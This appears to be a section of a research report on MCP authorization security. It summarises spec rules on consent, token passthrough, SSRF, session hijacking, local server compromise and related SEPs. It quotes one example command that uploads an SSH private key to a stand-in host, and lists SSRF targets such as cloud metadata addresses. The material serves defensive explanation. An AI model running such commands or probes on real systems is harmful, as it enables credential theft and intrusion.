    - Signed, or server-side.
    - "Bind to the specific `client_id` (not just 'user has consented')".
  - **Redirect URIs (MUST):**
    - Exact match with the registered URI.
    - Reject requests where it changed without re-registration.
    - "exact string matching (not pattern matching or wildcards)".
  - **`state` (MUST):**
    - Cryptographically random.
    - Stored server-side "**only after** consent has been explicitly approved", set "**immediately before** redirecting to the third-party identity provider".
    - Exact match at the callback; reject if missing or mismatched.
    - Single-use, with a short expiry (e.g. 10 minutes).
    - The cookie or session containing `state` "**MUST NOT** be set until **after** the user has approved the consent screen".

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- **Correct order** (from the spec's diagram):
  1. Client registers with the MCP server.
  2. `GET /authorize?client_id&redirect_uri` hits the MCP server.
  3. The MCP server checks consent for this `client_id`.
  4. The MCP server shows its own consent page ("Allow [Client Name] to access [Third-Party API]?").
  5. `POST /consent`, and the decision is stored.
  6. Redirect to the third-party `/authorize` with the static client_id.
  7. The third-party AS redirects back with a code.
  8. The MCP server exchanges the code.
  9. Redirect to the client's registered `redirect_uri`.

  — same source

**Token Passthrough (explicitly forbidden)**
- Definition: "an anti-pattern where an MCP server accepts tokens from an MCP client without validating that the tokens were properly issued *to the MCP server* and passes them through to the downstream API". — same source
- 2026-07-28 places the two dimensions here (earlier revisions put them in the core spec):
  1. "Audience validation failures", e.g. not checking `aud` per RFC 9068.
  2. "Token passthrough", forwarding unmodified tokens, which "can potentially cause the 'confused deputy' problem".

  — same source; [2025-11-25 core spec](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization)
- Risks:
  - **Security Control Circumvention:** rate limiting and validation are bypassed.
  - **Accountability/Audit Trail Issues:** the server cannot distinguish clients, and downstream logs show the wrong source. A stolen token can use the server "as a proxy for data exfiltration".
  - **Trust Boundary Issues:** compromising one service gives access to others.
  - **Future Compatibility Risk.**

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- Mitigation: "MCP servers **MUST NOT** accept any tokens that were not explicitly issued for the MCP server". — same source

**Server-Side Request Forgery (SSRF)**
- Attacker-controllable URLs the client fetches during discovery:
  1. `resource_metadata` from `WWW-Authenticate`
  2. `authorization_servers` in PRM
  3. `token_endpoint`, `authorization_endpoint`, etc. in AS metadata

  — same source
- Attack patterns:
  - Internal IPs (`http://192.168.1.1/admin`)
  - Cloud metadata (`http://169.254.169.254/`)
  - Localhost services (`http://localhost:6379/`)
  - DNS rebinding
  - Redirect chains

  Example: `401 + resource_metadata="http://169.254.169.254/..."`. The client fetches it, and the response or error leaks back to the attacker. — same source
- Risks: credential exfiltration, internal recon, service interaction via POST, firewall bypass, data exfiltration. — same source
- Mitigations:
  - "MCP clients deployed to a server **MUST** consider SSRF risks".
  - **Enforce HTTPS (SHOULD):** reject `http://` except loopback in development, with an explicit opt-out for dev.
  - **Block private ranges (SHOULD, per RFC 9728 §7.7):** `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `127.0.0.0/8`, `::1`, `169.254.0.0/16`, `fc00::/7`, `fe80::/10`. "Avoid implementing IP validation manually" because of octal, hex and IPv4-mapped IPv6 tricks.
  - **Validate redirect targets (SHOULD):** consider disabling automatic redirects and validating each hop.
  - **Egress proxies (SHOULD consider):** e.g. Stripe Smokescreen.
  - **DNS TOCTOU:** "Consider pinning DNS resolution results between check and use".

  — same source
- **SSRF against authorization servers (section new in 2026-07-28 Best Practices):** with CIMD, "the authorization server takes a URL as input from an unknown client and fetches that URL". The same mitigations apply. — same source
- In the core spec, AS fetching CIMDs "**SHOULD** consider" SSRF risks. — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- SEP-991 adds: limit response size, timeouts, and rate-limit outbound fetches. It judges DDoS amplification as unlikely to be attractive, because responses are cacheable and the request/response sizes are symmetric. — [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)

**Session Hijacking (applies to 2025-11-25 and earlier; SUPERSEDED in 2026-07-28 by "State Handle Hijacking")**
- **2025-11-25, "Session Hijack Prompt Injection":**
  1. The client connects to Server A and receives a session ID.
  2. The attacker obtains the ID and sends a malicious event to Server B with it.
  3. Server B enqueues the event in a shared queue keyed by session ID.
  4. Server A polls the queue and delivers the payload as an async or resumed SSE response, e.g. via resumable streams or `notifications/tools/list_changed`.
  5. The client acts on it.

  — [Best Practices 2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices)
- **2025-11-25, "Session Hijack Impersonation":**
  1. The attacker obtains the session ID.
  2. The attacker calls the server with it.
  3. The server "does not check for additional authorization".

  — same source
- **2025-11-25 mitigations:**
  - Servers that implement authorization "**MUST** verify all inbound requests. MCP Servers **MUST NOT** use sessions for authentication".
  - "**MUST** use secure, non-deterministic session IDs".
  - "**SHOULD** bind session IDs to user-specific information", using the key format `<user_id>:<session_id>`, where the user ID "is derived from the user token and not provided by the client".

  — same source
- **2026-07-28, "State Handle Hijacking":**
  - Context: "MCP is stateless and has no protocol-level sessions". Servers mint explicit handles, such as a cart ID, passed as tool arguments.
  - Attack: the attacker obtains or guesses a handle, and the server operates on the original user's state.
  - Mitigations:
    - Servers "**MUST** verify all inbound requests".
    - Servers "**MUST NOT** treat possession of a state handle as authentication".
    - Handles **SHOULD** be secure random values.
    - Servers "**SHOULD** bind handles server-side to the authenticated user … keying stored state as `<user_id>:<handle>` where the user ID is derived from the verified token".
  - For session IDs under 2025-11-25 and earlier, the page refers back to the 2025-11-25 text.

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)

**Local MCP Server Compromise**
- Attacks:
  1. A malicious "startup" command in the client config, e.g. `npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://example.com/evil-location`.
  2. A malicious payload in the server itself.
  3. Reaching an insecure localhost server "via DNS rebinding".

  — same source
- Risks: arbitrary code execution, no visibility, command obfuscation, data exfiltration, data loss. — same source
- **Client mitigations:**
  - Clients that support one-click local configuration "**MUST** implement proper consent mechanisms prior to executing commands".
  - The consent dialog **MUST**:
    - "Show the exact command that will be executed, without truncation".
    - Flag the operation as dangerous.
    - Require explicit approval.
    - Allow cancel.
  - **SHOULD:**
    - Highlight `sudo` / `rm -rf`.
    - Warn about sensitive paths.
    - Sandbox with minimal privileges.
    - Provide explicit privilege grants.

  — same source
- These rules come from SEP-1024, "MCP Client Security Requirements for Local Server Installation", which is Final. — [SEP index](https://modelcontextprotocol.io/seps)
- **Server mitigations:** servers meant to run locally "**SHOULD**":
  - "Use the `stdio` transport to limit access to just the MCP client".
  - If using HTTP: "Require an authorization token" or "Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access".

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- **Related transport rule:** Streamable HTTP servers must return HTTP 403 for invalid `Origin` headers (clarified in 2025-11-25, PR #1439). — [2025-11-25 changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog)

**OAuth Authorization URL Validation (present in 2025-11-25 and 2026-07-28)**
- Attacks:
  - A malicious server supplies a `javascript:` authorization endpoint, which the client passes to `window.open()`, giving XSS.
  - A URL carrying shell metacharacters, opened via `cmd.exe` or PowerShell, gives RCE.
  - XSS combined with a local stdio proxy escalates to full system compromise.

  — same source
- Mitigations:
  - "**MUST** only allow `http://` and `https://` schemes", with `http://` only for loopback in development.
  - "**MUST** reject `javascript:`, `data:`, `file:`, `vbscript:`".
  - "**MUST NOT** use shell commands … to open URLs".
  - "**MUST** sanitize and validate all URLs received from MCP servers".
  - Web clients "**SHOULD**" use CSP: `script-src 'self'`.

  — same source

**stdio Transport Security in Proxy Scenarios**
- Applies only to proxy architectures that spawn stdio servers. The chain:
  1. XSS.
  2. Steal the proxy auth token.
  3. Make an authenticated request to the local proxy.
  4. The proxy spawns an arbitrary command.
  5. RCE.

  — same source
- Mitigations (**SHOULD**): sandbox spawned processes, restrict the filesystem, log stdio usage, require extra authorization for dangerous commands. — same source

**Mix-Up Attacks (new in 2026-07-28)**
- "An attacker that controls one of the authorization servers an MCP client interacts with may attempt to have the client send it an authorization code or token issued by a different, honest authorization server". — same source
- Mitigation is Authorization Response Validation (`iss`). The page notes:
  - "PKCE alone does not prevent this attack because the client transmits the `code_verifier` to the attacker's token endpoint".
  - Resource indicators do not help either.
  - The defence "depends on honest authorization servers emitting `iss`".

  — same source

**Localhost Redirect URI Impersonation, and CIMD Trust Policies**
- Attack:
  1. The attacker uses the legitimate client's CIMD URL as `client_id`.
  2. The attacker binds any localhost port as `redirect_uri`.
  3. The attacker receives the code.

  "the user will see the legitimate client's name". — same source
- AS countermeasures:
  - "**SHOULD** display additional warnings for `localhost`-only redirect URIs".
  - "**MAY** require additional attestation mechanisms".
  - "**MUST** clearly display the redirect URI hostname during authorization".

  — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- Trust policies (MAY):
  - Domain allowlists (protected servers).
  - Accept any HTTPS `client_id` (open servers).
  - Reputation, domain-age or certificate checks.
  - Prominent hostname display.

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- SEP-991 acknowledges that "this proposal has the same risks as DCR does in a localhost redirect scenario". It suggests platform attestations (iOS DeviceCheck, Android Play Integrity) or short-lived `private_key_jwt` as future hardening. — [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)

**Scope Minimization**
- Attack: a stolen token carrying broad scopes (`files:*`, `db:*`, `admin:*`), granted up front because the server listed everything in `scopes_supported`, enables lateral access and privilege chaining. — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- Risks: expanded blast radius, revocation friction, audit noise, privilege chaining, consent abandonment, scope-inflation blindness. — same source
- Mitigation is a progressive model:
  - A minimal initial scope (e.g. `mcp:tools-basic`).
  - "Incremental elevation via targeted `WWW-Authenticate` `scope="..."` challenges".
  - Down-scoping tolerance: the AS "MAY issue a subset".
  - Log elevation events with correlation IDs.
  - Clients cache denied elevations.

  — same source
- In 2026-07-28 the server's choice of challenge content is Minimum / Recommended / Extended, all framed around current-operation scopes. Clients **SHOULD** union scopes. — same source
- Common mistakes listed:
  - Publishing all scopes in `scopes_supported`.
  - Wildcard scopes (`*`, `all`, `full-access`).
  - Returning the whole catalog in every challenge.
  - "Treating claimed scopes in token as sufficient without server-side authorization logic".

  — same source

**Core-spec security considerations (2026-07-28) that complement Best Practices**
- "Token Theft": clients and servers "**MUST** implement secure token storage". — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- "Communication Security":
  - "All authorization server endpoints **MUST** be served over HTTPS".
  - "All redirect URIs **MUST** be either `localhost` or use HTTPS".

  — same source
- "Open Redirection":
  - Clients "**MUST** have redirect URIs registered".
  - The AS "**MUST** validate exact redirect URIs against pre-registered values".

  — same source

### Inferences
- Each threat maps to a specific defence:

  | Threat | Defence |
  | --- | --- |
  | Token redirection to a malicious RS | `resource` / audience binding |
  | Code interception | PKCE |
  | Multi-AS mix-up | `iss` + recorded issuer |
  | AS-metadata spoofing | issuer equality check |
  | Credential reuse across AS | issuer-keyed credentials |
  | Discovery URL abuse | SSRF controls |
  | Proxy consent bypass | per-client consent + `state` timing |
  | Session or handle replay | identity bound from the token, not the session |
  | Over-privileged tokens | scope minimization + step-up |

  This gives a threat-to-control matrix suitable for a diagram.
- Best Practices treats an MCP server that wraps a third-party API as both a resource server and an OAuth client. Most of its hard MUSTs (consent registry, cookie flags, `state` timing) fall on that proxy role.

### Gaps
- The 2025-06-18 Best Practices page was not fetched separately. I relied on the 2025-06-18 changelog for its introduction. Which sections first appeared in 2025-06-18 versus 2025-11-25 is not verified beyond the changelog note "Updated the Security Best Practices guidance". For example, I did not confirm whether SSRF, scope minimization and URL validation were 2025-11-25 additions.

---

## Key Question 4: What do the relevant SEPs and authorization extensions specify, and what is their status?

### Takeaway
As of October 2026 the modelcontextprotocol.io SEP index lists the core authorization SEPs as "Final":
- SEP-985 (PRM / RFC 9728 alignment)
- SEP-990 (enterprise IdP policy controls)
- SEP-991 (CIMD)
- SEP-1024 (local install consent)
- SEP-1036 (URL elicitation)
- SEP-1046 (client credentials)
- SEP-2207 (refresh tokens)
- SEP-2468 (`iss`)

The `ext-auth` repository lists two extensions:
- **Enterprise-Managed Authorization:** Stable. It uses an ID-JAG via RFC 8693 token exchange at the enterprise IdP, then an RFC 7523 JWT-bearer grant at the MCP AS.
- **OAuth Client Credentials:** Draft.

The roadmap lists these items without dates: DPoP, Workload Identity Federation, ID-JAG, and standard token exchange. I found no SEP or extension for OAuth over stdio.

### Cited Findings

**SEP statuses (modelcontextprotocol.io/seps, which lists 42 Final SEPs)**

| SEP | Title | Status | Created |
| --- | --- | --- | --- |
| SEP-985 | Align OAuth 2.0 Protected Resource Metadata with RFC 9728 | Final | 2025-07-16 |
| SEP-990 | Enable enterprise IdP policy controls during MCP OAuth flows | Final | 2025-06-04 |
| SEP-991 | Enable URL-based Client Registration using OAuth Client ID Metadata Documents | Final | 2025-07-07 |
| SEP-1024 | MCP Client Security Requirements for Local Server Installation | Final | not captured |
| SEP-1036 | URL Mode Elicitation for secure out-of-band interactions | Final | not captured |
| SEP-1046 | Support OAuth client credentials flow in authorization | Final | 2025-07-23 |
| SEP-2207 | OIDC-Flavored Refresh Token Guidance | Final | 2026-02-04 |
| SEP-2468 | Recommend Issuer (iss) Parameter in MCP Auth Responses | Final | 2026-03-25 |
| SEP-2133 | Extensions (framework) | Final | not captured |
| SEP-1865 | MCP Apps | Final | not captured |

— [SEP index](https://modelcontextprotocol.io/seps)

- SEP-835, SEP-837, SEP-2350, SEP-2351 and SEP-2352 are cited in the changelogs and RC post as shipped in 2025-11-25 / 2026-07-28 but do not appear in the index. — [2025-11-25 changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog); [RC post](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/); [SEP index](https://modelcontextprotocol.io/seps)

**SEP-991 (CIMD): rationale for replacing DCR**
- Authors: Paul Carleton and Aaron Parecki. It originally referenced draft-parecki-oauth-client-id-metadata-document-03. — [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)
- The 2025-11-25 and 2026-07-28 core specs cite draft-ietf-oauth-client-id-metadata-document-00. — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- Problems with DCR: "DCR requires servers to manage unbounded databases, handle expiration, and trust self-asserted metadata". Developer pre-registration is "impractical as servers may not exist when clients ship". — [SEP-991](https://modelcontextprotocol.io/seps/991-enable-url-based-client-registration-using-oauth-c)
- Benefits claimed:
  - "Verifiable Identity: The HTTPS URL serves as both identifier and trust anchor".
  - "Stable Identifiers: Unlike DCR's ephemeral IDs".
  - "Redirect URI Attestation". Redirect URIs are bound to the client domain via HTTPS rather than being "attacker-supplied".

  — same source
- Spec change: "adding Client ID Metadata documents as a SHOULD, and changing DCR to a MAY". — same source
- Risks acknowledged:
  - Localhost impersonation
  - SSRF
  - DDoS (judged low)
  - Maturity of the draft ("implemented by the platform Bluesky")
  - Client burden of hosting a JSON file
  - Fragmentation

  — same source

**SEP-990 / Enterprise-Managed Authorization extension (Stable)**
- Listed in `ext-auth` as "Enterprise-Managed Authorization – Stable" at `specification/stable/enterprise-managed-authorization.mdx`. — [ext-auth repo](https://github.com/modelcontextprotocol/ext-auth)
- Announced stable on 18 June 2026 by Paul Carleton (Core Maintainer). Contributors credited are "the authors of SEP-990". — [EMA blog post](https://blog.modelcontextprotocol.io/posts/enterprise-managed-auth/)
- The post says EMA "embeds Okta's Cross App Access (XAA) protocol into MCP". — same source
- Adoption named in the post:
  - Okta is the first IdP.
  - Anthropic has implemented EMA for Claude, Claude Code and Cowork.
  - VS Code supports it in preview.
  - Servers: Asana, Atlassian, Canva, Figma, Granola, Linear and Supabase, with Slack adding support.
  - Microsoft "adopting".

  — same source
- **Roles:**
  - MCP Client
  - Enterprise IdP ("IdP Authorization Server")
  - MCP Authorization Server ("Resource Authorization Server")
  - MCP Server (RS)

  — [EMA spec](https://github.com/modelcontextprotocol/ext-auth/blob/main/specification/stable/enterprise-managed-authorization.mdx)
- **Flow:**
  1. The user signs in to the client via OIDC or SAML SSO and gets an ID Token or SAML assertion.
  2. The client sends an RFC 8693 token exchange to the IdP:
     - `grant_type=urn:ietf:params:oauth:grant-type:token-exchange`
     - `requested_token_type=urn:ietf:params:oauth:token-type:id-jag`
     - `subject_token` plus its `subject_token_type`
     - `audience`, which "**MUST** be the issuer identifier of the Resource Authorization Server"
     - Optional `resource`, which "**MUST** be the MCP Server's Resource Identifier"
     - `scope`
  3. The IdP evaluates policy and returns the ID-JAG with `issued_token_type`, `access_token` (the ID-JAG), `token_type=N_A`, `scope` and `expires_in`.
  4. The client sends an RFC 7523 JWT-bearer grant to the MCP AS: `grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer`, `assertion=<ID-JAG>`, plus client authentication or a CIMD URL `client_id`.
  5. The MCP AS returns an access token that "**MUST** be audience-restricted to the MCP Server named in the ID-JAG's `resource` claim".
  6. The client calls the MCP server with that token.

  — same source
- **ID-JAG format:**
  - JWT header `typ: oauth-id-jag+jwt`, signed by the IdP.
  - Example claims: `jti`, `iss`, `sub`, `email`, `aud`, `resource`, `client_id`, `exp`, `iat`, `scope`.

  — same source
- **Discovery:** the MCP AS advertises `authorization_grant_profiles_supported` including `urn:ietf:params:oauth:grant-profile:id-jag`. — same source
- References:
  - draft-ietf-oauth-identity-assertion-authz-grant-04 (the IETF-adopted successor of the draft-parecki name)
  - draft-ietf-oauth-identity-chaining
  - RFC 8693
  - RFC 7523
  - draft-ietf-oauth-client-id-metadata-document-01

  — same source
- Problem it solves: per-user, per-server consent; no central policy or audit; mixing of personal and work accounts. With EMA, "The user isn't sent through a per-server consent screen". The IdP decides by group, role and conditional access. — [EMA blog post](https://blog.modelcontextprotocol.io/posts/enterprise-managed-auth/)

**SEP-1046 / OAuth Client Credentials (machine-to-machine)**
- SEP-1046 (author Darin McAdams) is "Final", Standards Track. — [SEP-1046](https://modelcontextprotocol.io/seps/1046-support-oauth-client-credentials-flow-in-authoriza)
- Motivation: client credentials "was dropped in subsequent revisions" after 2025-03-26. — same source
- Allowed authentication methods:
  - JWT assertions per RFC 7523, which are RECOMMENDED.
  - Client secrets via HTTP Basic.
  - "mTLS, are not included".

  — same source
- JWT contents and JWKS discovery are left unspecified "pending maturity" of WIMSE headless JWT and CIMD. — same source
- The `ext-auth` repo lists "Client Credentials – Draft" at `specification/draft/oauth-client-credentials.mdx`. — [ext-auth repo](https://github.com/modelcontextprotocol/ext-auth)
- That draft extension specifies:
  - **Flow:**
    1. 401 + `resource_metadata`.
    2. PRM.
    3. AS metadata.
    4. `POST token_endpoint` with `grant_type=client_credentials` and either a `client_assertion` (JWT, RECOMMENDED) or `client_id` + `client_secret`, plus `resource` and `scope`.
    5. Access token.
  - AS metadata "MUST include `token_endpoint_auth_methods_supported`" with `private_key_jwt` or `client_secret_basic`.
  - Credentials are pre-registered out-of-band. "Dynamic Client Registration is not used".

  — [Client Credentials draft](https://github.com/modelcontextprotocol/ext-auth/blob/main/specification/draft/oauth-client-credentials.mdx)
- The 2026-07-28 core spec mentions only "`client_credentials` clients" in the step-up section: they "**MAY** attempt the step-up authorization flow or abort". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)

**SEP-1036 (URL Mode Elicitation)**
- Final. It shipped in 2025-11-25 and is the sanctioned way for an MCP server to obtain third-party OAuth authorization. See Key Question 6. — [SEP index](https://modelcontextprotocol.io/seps); [2025-11-25 changelog](https://modelcontextprotocol.io/specification/2025-11-25/changelog)

**SEP-2468, SEP-2207, SEP-837, SEP-2352, SEP-2350, SEP-2351 (2026-07-28 hardening)**
- Described under Key Question 1. The RC post groups the "six SEPs" as aligning auth "more closely with OAuth 2.0 and OpenID Connect as deployed in practice". It also warns that "a future version will expect clients to reject responses that omit `iss`, so authorization servers should start sending it". — [RC post](https://blog.modelcontextprotocol.io/posts/2026-07-28-release-candidate/)

**Roadmap items (not yet specified)**
- The 22 August 2026 roadmap (Lead Maintainers David Soria Parra and Den Delimarsky) lists these under "Agent identity and enterprise-ready security":
  - "finalizing and driving adoption of DPoP (RFC 9449)"
  - Workload Identity Federation (PR #1933)
  - The ID-JAG grant
  - "standard token exchange"
  - Engagement with the IETF OAuth and WIMSE working groups
- Its "Looking back" section lists `iss` validation, issuer-bound credentials, CIMD-preferred registration and the EMA extension as shipped.

— [MCP Roadmap, 22 August 2026](https://blog.modelcontextprotocol.io/posts/mcp-roadmap/)

### Inferences
- **Status conflict on client credentials:** SEP-1046 is marked Final on the SEP index, while the `ext-auth` repo labels the Client Credentials extension "Draft". The 2026-07-28 core text does not itself define the client-credentials token request; it only references `client_credentials` clients in step-up. The most accurate summary as of October 2026 is that machine-to-machine client credentials are accepted in principle (SEP-1046 Final), with normative detail living in a draft extension.
- **Status of token exchange:** for EMA, token exchange (RFC 8693) is standardized only at the IdP leg, to obtain an ID-JAG. A general MCP-server-to-upstream token exchange (on-behalf-of chaining) is still a roadmap item, not spec text.

### Gaps
- No `io.modelcontextprotocol/...` extension identifier string for the auth extensions appeared in the `ext-auth` README or spec files I read. How EMA support is negotiated via the `extensions` capability field (added in 2026-07-28) is not documented in what I fetched.
- I did not fetch the SEP-990 page itself. Its details come via the EMA spec and blog.
- I did not find a DPoP SEP number in primary sources. The roadmap cites none; PR #1933 is Workload Identity Federation.
- I found no SEP or extension defining OAuth for stdio servers or a standard environment-credential convention.

---

## Key Question 5: How is stdio (local) server credential handling specified differently from HTTP?

### Takeaway
Every revision says stdio implementations "**SHOULD NOT**" use the OAuth authorization spec and should "retrieve credentials from the environment". No revision defines a format or variable names for those credentials. Local-server security is instead covered by Best Practices: consent before running one-click install commands, sandboxing, using stdio rather than an open localhost HTTP port, and authorization tokens or Unix sockets if HTTP is used.

### Cited Findings
- "Implementations using an STDIO transport **SHOULD NOT** follow this specification, and instead retrieve credentials from the environment." The wording is identical in 2025-03-26, 2025-06-18, 2025-11-25 and 2026-07-28. — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization); [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization); [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization); [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- The authorization spec "defines the authorization flow for HTTP-based transports". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- The Client Credentials draft extension's scope is "HTTP-based transports only". — [Client Credentials draft](https://github.com/modelcontextprotocol/ext-auth/blob/main/specification/draft/oauth-client-credentials.mdx)
- Local servers "**SHOULD**":
  - "Use the `stdio` transport to limit access to just the MCP client".
  - If HTTP: "Require an authorization token" or "Use unix domain sockets or other Interprocess Communication (IPC) mechanisms with restricted access".

  — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- One-click local installs: the client "**MUST**" show the exact untruncated command and require explicit approval (SEP-1024, Final). — same source; [SEP index](https://modelcontextprotocol.io/seps)
- Best Practices states "The `stdio` transport itself is not inherently vulnerable". Risk arises in proxy architectures where a local proxy spawns stdio servers: XSS leads to a stolen proxy token, which leads to arbitrary command spawn. Proxies "**SHOULD**" sandbox, restrict the filesystem, log, and require extra authorization for dangerous commands. — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)
- In 2026-07-28, `server/discover` can be used "as a backward-compatibility probe on STDIO", and the stateless redesign applies to stdio as well. — [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- The 2026-07-28 deprecation note recommends logging to `stderr` for stdio. — [Deprecated registry](https://modelcontextprotocol.io/specification/2026-07-28/deprecated)

### Inferences
- The trust boundary differs by transport. With stdio, the client launches the server process and passes secrets (API keys, tokens) via environment variables or config. Security therefore depends on OS process isolation and installation consent, not on OAuth audience binding.
- A local server that needs third-party OAuth would have to handle that flow itself, outside MCP.

### Gaps
- No primary source defines environment-variable naming, secret storage or rotation for stdio servers.
- No source covers whether a stdio server may use URL-mode elicitation for third-party OAuth. Elicitation is transport-agnostic, but its "Identifying the User" guidance assumes MCP authorization exists. I found no explicit stdio guidance.

---

## Key Question 6: What does the spec say about never passing tokens upstream, audience validation, and the MCP server acting as an OAuth client to third-party APIs?

### Takeaway
Since 2025-06-18, the rules have been:
- An MCP server **MUST** accept only tokens whose audience is itself.
- It "**MUST NOT** accept or transit any other tokens".
- When it calls upstream APIs it acts as a separate OAuth client with a separate upstream-issued token. It "**MUST NOT** pass through the token it received from the MCP client".

The 2025-03-26 design, where the MCP server issued its own token "bound to the third-party session", is superseded. Since 2025-11-25 the sanctioned way to get user consent for third-party APIs is URL-mode elicitation. Under it, third-party credentials never transit the MCP client, and the server must verify that the user completing the flow is the user who triggered it.

### Cited Findings

**Audience validation and token passthrough (2025-06-18 → 2026-07-28)**
- "MCP servers **MUST** validate that access tokens were issued specifically for them as the intended audience, according to RFC 8707 Section 2". — [2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization)
- "MCP clients **MUST NOT** send tokens to the MCP server other than ones issued by the MCP server's authorization server. MCP servers **MUST** only accept tokens that are valid for use with their own resources. MCP servers **MUST NOT** accept or transit any other tokens." — same source
- Servers "**MUST** reject tokens that do not include them in the audience claim or otherwise verify that they are the intended recipient of the token". — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- "If the MCP server makes requests to upstream APIs, it may act as an OAuth client to them. The access token used at the upstream API is a separate token, issued by the upstream authorization server. The MCP server **MUST NOT** pass through the token it received from the MCP client." Present since 2025-06-18. — same source; [2025-06-18](https://modelcontextprotocol.io/specification/2025-06-18/basic/authorization)
- RFC 8707 provides binding "**when the Authorization Server supports the capability**". The client-side `resource` MUST still applies "to enable current and future adoption". The server-side audience check is unconditional. — [Security Considerations 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations)
- The 2025-06-18 changelog states the purpose of the RFC 8707 requirement: "to prevent malicious servers from obtaining access tokens". — [2025-06-18 changelog](https://modelcontextprotocol.io/specification/2025-06-18/changelog)

**Third-party authorization: the 2025-03-26 design (SUPERSEDED)**
- The MCP server was simultaneously the AS to the MCP client and the OAuth client to the third-party AS. Flow:
  1. The client starts OAuth with the MCP server.
  2. The MCP server redirects to the third-party `/authorize`.
  3. The user authorizes there.
  4. The third-party AS redirects back to the MCP server with a code.
  5. The MCP server exchanges the code.
  6. The MCP server generates a "bound MCP token".
  7. The MCP server redirects to the client callback with an MCP code, which the client exchanges for the MCP token.

  — [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26/basic/authorization)
- This pattern survives in Best Practices as the "MCP proxy server" in the confused-deputy section, with mandatory per-client consent. See Key Question 3. — [Best Practices 2026-07-28](https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices)

**Third-party authorization via URL-mode elicitation (2025-11-25 → 2026-07-28)**
- URL mode "is *not* for authorizing the MCP client's access to the MCP server … The MCP client's bearer token remains unchanged". MCP servers "**MUST NOT** rely on URL mode elicitation to authorize users for themselves". — [Elicitation 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/client/elicitation)
- In external authorization the server is "An OAuth resource server (to the MCP client)" and "An OAuth client (to the third-party resource server)". — same source
- Critical requirements:
  1. "The third-party credentials **MUST NOT** transit through the MCP client".
  2. "The MCP server **MUST NOT** use the client's credentials for the third-party service", because that would be token passthrough.
  3. "The user **MUST** authorize the MCP server directly".
  4. The MCP server stores the third-party tokens, so it "must be stateful".
  5. The server "**MUST NOT** transmit credentials obtained through URL mode elicitation to the MCP client".

  — same source
- **Flow (2026-07-28, using MRTR):**
  1. `tools/call` arrives.
  2. The server binds state to the user and returns `InputRequiredResult` with `mode: "url"`, `url: "https://mcp.example.com/connect?..."` and `requestState`.
  3. The client shows the full URL and gets consent.
  4. The client opens the URL in a secure browser, not an inspectable webview. Example: SFSafariViewController is acceptable, WKWebView is not.
  5. The client retries the call with `action: "accept"` and `requestState`.
  6. The browser loads the connect route. The server confirms the user is logged in to the MCP server or MCP AS and that the "elicitation user matches session user".
  7. The server redirects to the third-party AS, the user consents, and the third-party AS redirects back to the MCP server's `redirect_uri`.
  8. The server exchanges the code and binds the tokens to the MCP user identity.
  9. The server calls the third-party RS.

  — same source
- **Phishing / account-takeover narrative:**
  1. Alice triggers an elicitation.
  2. She sends the URL to Bob instead of opening it.
  3. Bob completes the third-party OAuth.
  4. Bob's tokens get bound to Alice.

  Mitigation: the server "**MUST** ensure that the user who started the elicitation request … is the same user who completes the authorization flow". For example, compare the MCP AS `sub` with the browser session's subject. — same source
- **Safe-URL rules.** Servers:
  - "**MUST NOT**" put credentials or PII in the URL.
  - "**MUST NOT** provide a URL which is pre-authenticated".

  Clients:
  - "**MUST NOT** automatically pre-fetch the URL".
  - "**MUST NOT** open the URL without explicit consent".
  - "**MUST** show the full URL".

  — same source
- **User identity:** for remote servers, user identity "**MUST** be derived from credentials acquired via MCP authorization when possible (e.g. `sub` claim)". Servers "**MUST NOT** rely on client-provided user identification". — same source
- **Changes in 2026-07-28:** `notifications/elicitation/complete` and `elicitationId` were removed. Completion is learned by retrying the original request, and servers correlate via `requestState`. — [2026-07-28 changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)

